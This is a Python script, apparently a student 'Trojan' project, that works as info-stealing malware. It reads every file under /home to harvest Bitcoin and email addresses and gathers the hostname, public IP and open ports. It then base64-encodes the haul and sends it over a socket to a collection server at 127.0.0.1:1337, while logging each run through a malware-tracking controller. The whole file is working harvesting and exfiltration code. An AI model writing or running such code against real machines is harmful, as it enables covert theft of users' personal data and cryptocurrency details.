import os
import re
import json
import socket
import base64
import requests
import psutil
from malwareController import MalwareController
from get_ports import get_open_ports

# Define the log file
LOG_FILE =  "D:/notes/IAI Workstation/YEAR 3/ADVANCE PYTHON PROGRAMMING/project/Trojan/system_scan_log.json"

def get_public_ip():
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
    }
    try:
        return requests.get("https://ipapi.co/ip", headers=headers, timeout=5).text.strip()
    except:
        return "Unknown"



def scan_files_for_patterns(base_dir, bitcoin_pattern, email_pattern):
    bitcoin_addresses = []
    email_addresses = []
    for root, _, files in os.walk(base_dir):
        for file in files:
            try:
                file_path = os.path.join(root, file)
                with open(file_path, "r", errors="ignore") as f:
                    content = f.read()
                    bitcoin_addresses += re.findall(bitcoin_pattern, content)
                    email_addresses += re.findall(email_pattern, content)
            except (PermissionError, IsADirectoryError):
                continue
    return bitcoin_addresses, email_addresses

def update_log_file(data):
    try:
        # Initialize or load existing data
        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:  # Check if file is not empty
            with open(LOG_FILE, 'r') as f:
                try:
                    existing_data = json.load(f)
                except json.JSONDecodeError:
                    existing_data = {}  # If JSON is invalid, reset to empty
        else:
            existing_data = {}
        
        # Update the log with new data
        for key, value in data.items():
            existing_data[key] = value
        
        # Write back to the file
        with open(LOG_FILE, "w") as f:
            json.dump(existing_data, f, indent=4)  # Fixed usage of json.dump
    except Exception as e:
        print(f"Error updating log file: {e}")


def send_to_server(data):
    try:
        encoded_data = base64.b64encode(json.dumps(data).encode())
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(("127.0.0.1", 1337))
            s.send(encoded_data)
    except Exception as e:
        print(f"Error sending data to server: {e}")

def main():
    malware_controller = MalwareController()
    # Get machine details
    hostname = socket.gethostname()
    public_ip = get_public_ip()
    
    # Define patterns
    bitcoin_pattern = r"([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})"
    email_pattern = r"[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}"
    
    # Scan for Bitcoin and email addresses
    bitcoin_addresses, email_addresses = scan_files_for_patterns("/home", bitcoin_pattern, email_pattern)
    
    # Get open ports
    open_ports = get_open_ports()

    #create malware instance and save into malware table
    result = malware_controller.create_malware_record()
    print(f"result: {result}")

    
    # Prepare data
    data = {
        "machine_hostname": hostname,
        "machine_ip": public_ip,
        "machine_open_ports": open_ports,
        "bitcoin_addresses_found": bitcoin_addresses,
        "email_addresses_found": email_addresses
    }
    
    # Update log file
    update_log_file(data)
    
    # Send data to server
    send_to_server(data)

if __name__ == "__main__":
    main()
